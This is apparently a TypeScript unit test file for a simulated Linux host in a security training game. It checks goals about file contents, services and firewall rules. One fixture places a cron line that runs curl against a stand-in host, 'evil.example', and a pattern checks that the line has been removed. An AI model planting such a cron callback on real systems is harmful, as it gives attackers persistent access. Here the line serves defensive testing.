import { describe, it, expect, beforeEach } from 'vitest';
import { StateGoal } from '@kritis/shared';
import { createShell } from './index';
import { ShellEngine } from './ShellEngine';
import { createHostState } from './hosts';
import { checkStateGoal, checkStateGoals } from './stateGoals';

describe('stateGoals', () => {
  let engine: ShellEngine;

  beforeEach(() => {
    engine = createShell({ type: 'bash', user: 'root', hostname: 'gateway' });
  });

  describe('file + matches', () => {
    it('passes when the file content matches the regex (multiline)', () => {
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'Port 22\nPermitRootLogin no\n');
      expect(checkStateGoal(engine, { file: '/etc/ssh/sshd_config', matches: '^PermitRootLogin no$' })).toBe(true);
    });

    it('fails when the regex does not match', () => {
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'PermitRootLogin yes\n');
      expect(checkStateGoal(engine, { file: '/etc/ssh/sshd_config', matches: '^PermitRootLogin no$' })).toBe(false);
    });

    it('fails when the file cannot be read', () => {
      expect(checkStateGoal(engine, { file: '/no/such/file', matches: 'x' })).toBe(false);
    });

    it('fails (never throws) on an invalid authored regex', () => {
      engine.getBaseHost().vfs.addFile('/tmp/a.txt', 'content');
      expect(() => checkStateGoal(engine, { file: '/tmp/a.txt', matches: '([' })).not.toThrow();
      expect(checkStateGoal(engine, { file: '/tmp/a.txt', matches: '([' })).toBe(false);
    });
  });

  describe('file + absentMatches', () => {
    it('passes when the file exists and does not match', () => {
      engine.getBaseHost().vfs.addFile('/etc/crontab', '# clean\n');
      expect(checkStateGoal(engine, { file: '/etc/crontab', absentMatches: 'curl.*evil' })).toBe(true);
    });

    it('fails when the pattern is still present', () => {
      engine.getBaseHost().vfs.addFile('/etc/crontab', '* * * * * curl http://evil.example\n');
      expect(checkStateGoal(engine, { file: '/etc/crontab', absentMatches: 'curl.*evil' })).toBe(false);
    });

    it('fails when the file is missing — absentMatches asserts a clean EXISTING file', () => {
      expect(checkStateGoal(engine, { file: '/etc/crontab', absentMatches: 'curl' })).toBe(false);
    });
  });

  describe('omniscient reads', () => {
    it('evaluates matches/absentMatches on a root-owned 600 file while the session user is unprivileged', () => {
      const web = createHostState({ id: 'web02', hostname: 'web02' }, { user: 'www-data' });
      engine.registerHost(web);
      web.vfs.addFile('/etc/shadow-config', 'Secret=42\n');
      web.vfs.chown('/etc/shadow-config', 'root', 'root');
      web.vfs.chmod('/etc/shadow-config', '600');
      engine.pushSession('web02', 'www-data');

      // Sanity: the in-game user cannot read the file...
      expect(web.vfs.readFile('/etc/shadow-config').ok).toBe(false);
      // ...but goal evaluation is omniscient and still sees the content.
      expect(checkStateGoal(engine, { host: 'web02', file: '/etc/shadow-config', matches: '^Secret=42$' })).toBe(true);
      expect(checkStateGoal(engine, { host: 'web02', file: '/etc/shadow-config', absentMatches: 'Backdoor' })).toBe(true);
    });

    it('a directory path fails matches goals', () => {
      engine.getBaseHost().vfs.addDirectory('/opt/data');
      expect(checkStateGoal(engine, { file: '/opt/data', matches: '.' })).toBe(false);
    });
  });

  describe('vacuous goals are rejected', () => {
    it('an empty goal object is false', () => {
      expect(checkStateGoal(engine, {})).toBe(false);
    });

    it('matches without file is false', () => {
      expect(checkStateGoal(engine, { matches: 'x' } as StateGoal)).toBe(false);
    });

    it('file without any file assertion is false', () => {
      engine.getBaseHost().vfs.addFile('/tmp/x', 'x');
      expect(checkStateGoal(engine, { file: '/tmp/x' })).toBe(false);
    });

    it('serviceState without service is false', () => {
      expect(checkStateGoal(engine, { serviceState: 'active' } as StateGoal)).toBe(false);
    });

    it('serviceEnabled: false with a service is a legal, non-vacuous assertion', () => {
      const svc = engine.getBaseHost().services.find(s => s.unit === 'ssh.service')!;
      svc.enabled = 'disabled';
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: false })).toBe(true);
    });
  });

  describe('fileExists / fileAbsent', () => {
    it('explicit false inverts the assertion', () => {
      engine.getBaseHost().vfs.addFile('/tmp/present', 'x');
      // fileExists: false ⇔ the file must NOT exist.
      expect(checkStateGoal(engine, { file: '/tmp/present', fileExists: false })).toBe(false);
      expect(checkStateGoal(engine, { file: '/tmp/absent', fileExists: false })).toBe(true);
      // fileAbsent: false ⇔ the file MUST exist.
      expect(checkStateGoal(engine, { file: '/tmp/present', fileAbsent: false })).toBe(true);
      expect(checkStateGoal(engine, { file: '/tmp/absent', fileAbsent: false })).toBe(false);
    });

    it('fileExists: true passes iff the file exists', () => {
      engine.getBaseHost().vfs.addFile('/var/backup/dump.sql', 'data');
      expect(checkStateGoal(engine, { file: '/var/backup/dump.sql', fileExists: true })).toBe(true);
      expect(checkStateGoal(engine, { file: '/var/backup/other.sql', fileExists: true })).toBe(false);
    });

    it('fileAbsent: true passes iff the file is gone', () => {
      engine.getBaseHost().vfs.addFile('/tmp/malware.sh', 'bad');
      expect(checkStateGoal(engine, { file: '/tmp/malware.sh', fileAbsent: true })).toBe(false);
      expect(checkStateGoal(engine, { file: '/tmp/gone.sh', fileAbsent: true })).toBe(true);
    });
  });

  describe('service state', () => {
    it('matches serviceState against active, addressed as ssh / ssh.service / sshd', () => {
      for (const name of ['ssh', 'ssh.service', 'sshd']) {
        expect(checkStateGoal(engine, { service: name, serviceState: 'active' })).toBe(true);
        expect(checkStateGoal(engine, { service: name, serviceState: 'inactive' })).toBe(false);
      }
    });

    it('fails when the unit does not exist', () => {
      expect(checkStateGoal(engine, { service: 'nginx', serviceState: 'active' })).toBe(false);
    });

    it('serviceEnabled compares the enabled flag', () => {
      const svc = engine.getBaseHost().services.find(s => s.unit === 'ssh.service')!;
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: true })).toBe(true);
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: false })).toBe(false);
      svc.enabled = 'disabled';
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: true })).toBe(false);
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: false })).toBe(true);
    });
  });

  describe('firewallRule', () => {
    it('present (default true): passes on a matching global rule', () => {
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 443 });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 443 } })).toBe(true);
      expect(checkStateGoal(engine, { firewallRule: { action: 'deny', port: 443 } })).toBe(false);
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 80 } })).toBe(false);
    });

    it('is proto-insensitive: a 22/tcp rule and a proto-less rule both match a port-22 goal', () => {
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 22, proto: 'tcp' });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 22, present: true } })).toBe(true);

      engine.getBaseHost().firewall.rules.length = 0;
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 22 });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 22, present: true } })).toBe(true);
    });

    it('a from-scoped rule does NOT satisfy present:true', () => {
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 22, proto: 'tcp', from: '10.0.30.5' });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 22, present: true } })).toBe(false);
    });

    it('a from-scoped rule DOES block present:false — the hole is not closed', () => {
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 22, from: '10.0.30.5' });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 22, present: false } })).toBe(false);
    });

    it('present:false passes only when no rule matches action+port at all', () => {
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 3389, present: false } })).toBe(true);
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 3389, proto: 'tcp' });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 3389, present: false } })).toBe(false);
      // A rule with a different action does not block the goal.
      expect(checkStateGoal(engine, { firewallRule: { action: 'deny', port: 3389, present: false } })).toBe(true);
    });
  });

  describe('firewallDefaultIncoming', () => {
    it('compares the configured default policy, regardless of enabled', () => {
      expect(checkStateGoal(engine, { firewallDefaultIncoming: 'allow' })).toBe(true);
      expect(checkStateGoal(engine, { firewallDefaultIncoming: 'deny' })).toBe(false);
      engine.getBaseHost().firewall.defaultIncoming = 'deny';
      engine.getBaseHost().firewall.enabled = false;
      expect(checkStateGoal(engine, { firewallDefaultIncoming: 'deny' })).toBe(true);
    });
  });

  describe('host resolution', () => {
    it('unknown host returns false and never throws', () => {
      expect(() => checkStateGoal(engine, { host: 'ghost', fileExists: true, file: '/etc/passwd' })).not.toThrow();
      expect(checkStateGoal(engine, { host: 'ghost', file: '/etc/passwd', fileExists: true })).toBe(false);
    });

    it('evaluates against a registered secondary host', () => {
      const web = createHostState({ id: 'web01', hostname: 'web01.stadtwerke.local', ip: '10.0.20.10' });
      engine.registerHost(web);
      web.vfs.addFile('/var/www/index.html', 'hacked');
      expect(checkStateGoal(engine, { host: 'web01', file: '/var/www/index.html', matches: 'hacked' })).toBe(true);
      // Base host does not have the file — an unset host must not hit web01.
      expect(checkStateGoal(engine, { file: '/var/www/index.html', matches: 'hacked' })).toBe(false);
    });
  });

  describe('combined fields and checkStateGoals', () => {
    it('ANDs multiple fields on one goal', () => {
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'PermitRootLogin no\nPasswordAuthentication yes\n');
      expect(checkStateGoal(engine, {
        file: '/etc/ssh/sshd_config',
        matches: '^PermitRootLogin no$',
        absentMatches: '^PasswordAuthentication yes$',
      })).toBe(false);
      expect(checkStateGoal(engine, {
        file: '/etc/ssh/sshd_config',
        matches: '^PermitRootLogin no$',
        absentMatches: '^PermitRootLogin yes$',
      })).toBe(true);
    });

    it('checkStateGoals requires a non-empty list where every goal holds', () => {
      expect(checkStateGoals(engine, [])).toBe(false);
      engine.getBaseHost().vfs.addFile('/tmp/done', 'ok');
      const goals: StateGoal[] = [
        { file: '/tmp/done', fileExists: true },
        { service: 'ssh', serviceState: 'active' },
      ];
      expect(checkStateGoals(engine, goals)).toBe(true);
      expect(checkStateGoals(engine, [...goals, { service: 'ssh', serviceState: 'failed' }])).toBe(false);
    });
  });
});
